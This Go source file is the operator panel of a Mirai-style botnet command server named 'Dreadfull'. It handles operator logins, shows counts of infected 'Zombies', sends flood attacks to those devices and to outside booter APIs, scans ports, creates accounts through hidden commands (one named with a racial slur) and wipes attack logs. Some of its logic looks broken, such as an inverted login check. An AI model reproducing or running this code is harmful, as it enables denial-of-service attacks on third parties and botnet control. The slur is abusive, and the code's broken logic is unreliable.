package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type ScanResult struct {
	Success bool
	Port    int
	Elapsed time.Duration
}

type Api struct {
	Name string `json:"name,omitempty"`
	Url  string `json:"url,omitempty"`
}

type Config struct {
	Apis []Api `json:"apis,omitempty"`
}

func PortScan(host string, ports ...int) (scanResults []ScanResult) {
	chans := make(chan ScanResult, 0)
	for _, port := range ports {
		go func(scanPort int) {
			dialer := net.Dialer{Timeout: time.Second * 1}
			start := time.Now()
			_, err := dialer.Dial("tcp", host+":"+strconv.Itoa(scanPort))
			elapsed := time.Since(start)
			if err != nil {
				chans <- ScanResult{false, scanPort, elapsed}
				return
			}
			chans <- ScanResult{true, scanPort, elapsed}
		}(port)
	}
	for i := 0; i < len(ports); i++ {
		success := <-chans
		if success.Success {
			log.Printf("\x1b[1;35mConnected to %s:%d in %s", host, success.Port, success.Elapsed)
			scanResults = append(scanResults, success)
		}
	}
	return scanResults
}

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get Adminname
	this.conn.Write([]byte("\033[2J\033[1H"))

	this.conn.Write([]byte("\x1b[1;31mUsername\x1b[1;31m:\x1b[1;37m "))
	Adminname, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.Write([]byte("\x1b[1;31mPassword\x1b[1;31m:\x1b[1;37m "))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	var loggedIn bool
	var AdminInfo AccountInfo
	if loggedIn, AdminInfo = database.TryLogin(Adminname, password); loggedIn {
		this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		this.conn.Close()
		return
	}

	if len(Adminname) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		AdminnameFormat := "Username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, AdminnameFormat, Adminname, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}

	if MainBanner, err := ioutil.ReadFile("assets/main"); err != nil {

		this.conn.Write([]byte("\r\nBanner From assets/main was Removed\r\n"))

	} else {

		this.conn.Write([]byte(MainBanner))

	}

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > AdminInfo.maxBots && AdminInfo.maxBots != -1 {
				BotCount = AdminInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			if AdminInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Zombies: %d | Users: %d | Ongoing %d/1\007", BotCount, database.totalAdmins(), database.runningatk()))); err != nil {
					this.conn.Close()
					break
				}
			}
			if AdminInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Zombies: %d | Ongoing %d/1\007", BotCount, database.runningatk()))); err != nil {
					this.conn.Close()
					break
				}
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
			time.Sleep(time.Second * 1)
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;37m" + Adminname + "@\x1b[0;35mDreadfull\x1b[1;37m# "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}

		if cmd == "" {
			continue
		}

		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			if MainBanner, err := ioutil.ReadFile("assets/main"); err != nil {

				this.conn.Write([]byte("\r\nBanner From assets/main was Removed\r\n"))

			} else {

				this.conn.Write([]byte(MainBanner))

			}

			continue
		}
		if cmd == "?" || cmd == "methods" {
			if MainBanner, err := ioutil.ReadFile("assets/methods"); err != nil {

				this.conn.Write([]byte("\r\nBanner From assets/main was Removed\r\n"))

			} else {

				this.conn.Write([]byte(MainBanner))

			}

			continue
		}
		if cmd == "api" {
			if MainBanner, err := ioutil.ReadFile("assets/api"); err != nil {

				this.conn.Write([]byte("\r\nBanner From assets/main was Removed\r\n"))

			} else {

				this.conn.Write([]byte(MainBanner))

			}

			continue
		}
		if cmd == "ongoing" {
			this.conn.Write([]byte("\x1b[1;31m┌──────────────────────\x1b[0;35m─────────────────────────────────┐\x1B[0;35m\r\n"))
			this.conn.Write([]byte("\x1b[1;31m│ ID            COMMAND         DURATION        BOTS    │\x1B[0;35m\r\n"))
			this.conn.Write([]byte("\x1b[1;31m└──────────────────────\x1b[0;35m─────────────────────────────────┘\x1B[0;35m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m %d        %s        %d            %d\r\n", database.ongoingIds(), database.ongoingCommands(), database.ongoingDuration(), database.ongoingBots())))
		}

		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			//this.conn.Close()
			return
		}

		if cmd == "commands" || cmd == "help" {
			if MainBanner, err := ioutil.ReadFile("assets/help"); err != nil {

				this.conn.Write([]byte("\r\nBanner From assets/main was Removed\r\n"))

			} else {

				this.conn.Write([]byte(MainBanner))

			}
			continue
		}
		if strings.Split(cmd, " ")[0] == "portscan" {
			portsStrings := strings.Split(cmd, " ")
			if len(portsStrings) > 2 {
				ports := []int{}
				for _, portString := range portsStrings {
					port, err := strconv.Atoi(portString)
					if err != nil {
						continue
					}
					ports = append(ports, port)
				}
				scanResults := PortScan(portsStrings[1], ports...)
				for _, scanResult := range scanResults {
					if scanResult.Success {
						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35mConnected to %s:%d in %s\r\n", portsStrings[1], scanResult.Port, scanResult.Elapsed)))
					}
				}
			}
			continue
		}

		if strings.HasPrefix(strings.Split(cmd, " ")[0], "attack") {
			attackArgs := strings.Split(cmd, " ")
			if len(attackArgs) > 3 {
				file, err := os.ReadFile("config.json")
				if err != nil {
					this.conn.Write([]byte("Error reading config\n"))
					return
				}
				config := Config{}
				err = json.Unmarshal(file, &config)
				if err != nil {
					this.conn.Write([]byte("Error parsing config\n"))
					return
				}
				foundApi := false
				api := Api{}
				for _, a := range config.Apis {
					if a.Name == attackArgs[1] {
						foundApi = true
						api = a
					}
				}
				if !foundApi {
					continue
				}
				client := http.Client{Timeout: time.Second * 5}
				sendUrl := strings.ReplaceAll(api.Url, "{{host}}", attackArgs[2])
				sendUrl = strings.ReplaceAll(sendUrl, "{{port}}", attackArgs[3])
				sendUrl = strings.ReplaceAll(sendUrl, "{{time}}", attackArgs[4])
				println(sendUrl)
				response, err := client.Get(sendUrl)
				if err != nil {
					continue
				}
				if response.StatusCode != 200 {
					this.conn.Write([]byte("Didn't send successfully\n"))
					continue
				}
				this.conn.Write([]byte("Attack Sent Successfully\n"))
				responseData, err := ioutil.ReadAll(response.Body)
				if err != nil {
					log.Fatal(err)
				}

				responseString := string(responseData)
				println(responseString)
			}
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			AdminnameFormat := "Adminname:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, AdminnameFormat, Adminname, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = AdminInfo.maxBots

		if AdminInfo.admin == 1 && cmd == "notsofastnigga" {
			this.conn.Write([]byte("Adminname: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}

		if AdminInfo.admin == 1 && cmd == "clearlogs" {
			this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + Adminname + " \033[1;91m!\r\n")
			}
			continue
		}

		if AdminInfo.admin == 1 && cmd == "undo" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exist.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		if AdminInfo.admin == 1 && cmd == "DREADFULLMIRIA" {
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m \x1b[1;31m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m \x1b[1;31m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m \x1b[1;31m%s\033[0m\r\n", "Failed To Create New Admin. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;31m-\x1b[1;31m>\x1b[1;31m User Added Successfully.\033[0m\r\n"))
			}
			continue
		}
		if cmd == "bots" || cmd == "botcount" {
			botCount = clientList.Count()
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTotal botcount\x1b[1;37m: %d\r\n\033[0m", botCount)))
			continue
		}

		atk, err := NewAttack(cmd, AdminInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(Adminname, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var AttackCount int
					if clientList.Count() > AdminInfo.maxBots && AdminInfo.maxBots != -1 {
						AttackCount = AdminInfo.maxBots
					} else {
						AttackCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mAttack has been sent to %d devices\r\n", AttackCount)))
				} else {
					fmt.Println("Blocked Attack By " + Adminname + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (out string, err error) {
	buf := make([]byte, 1024)

	for {

		if n, err := this.conn.Read(buf); err != nil || n == 0 {

			return "", err

		} else {

			switch buf[0] {

			case 128:

				out = out[:len(out)-1]

				this.conn.Write([]byte{127})

			case '\r', '\n':
				this.conn.Write([]byte("\r\n"))

				return string(buf), nil

			default:

				if len(buf) > 1024 {

					continue

				} else if masked {

					this.conn.Write([]byte("*"))

				} else {

					this.conn.Write([]byte(buf[:n]))

				}

				out += string(buf[:n])

			}

		}

	}

}
